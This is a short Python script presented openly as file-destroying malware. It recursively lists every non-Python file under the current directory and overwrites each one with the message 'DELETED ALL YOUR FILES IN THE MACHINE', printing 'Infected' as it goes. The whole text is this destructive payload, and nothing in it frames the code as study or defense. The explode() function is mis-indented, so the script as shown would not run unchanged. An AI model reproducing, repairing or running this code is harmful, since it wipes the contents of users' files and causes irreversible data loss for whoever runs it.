#!/usr/bin/python 
import os, datetime, inspect 
def search(path): #search for target files in path
    print("Searching!!!...")
    filestoinfect = [] 
    filelist = os.listdir(path)
    for filename in filelist:
        if os.path.isdir(path+"/"+filename): #If it is a folder 
            filestoinfect.extend(search(path+"/"+filename)) 
        elif filename[-3:] != ".py":
            filestoinfect.append(path+"/"+filename)
    return filestoinfect 
def infect(filestoinfect): #changes to be made in the target file
    print("Start to Infect")
    for fname in filestoinfect:
         print(fname, "     Infected XXX ")
         f = open(fname,"w") 
         f.write("DELETED ALL YOUR FILES IN THE MACHINE") 
         f.close() 
def explode():
print("DELETED ALL YOUR FILES IN THE MACHINE!!")
filestoinfect = search(os.path.abspath(""))
print(filestoinfect)
infect(filestoinfect) 
explode() 
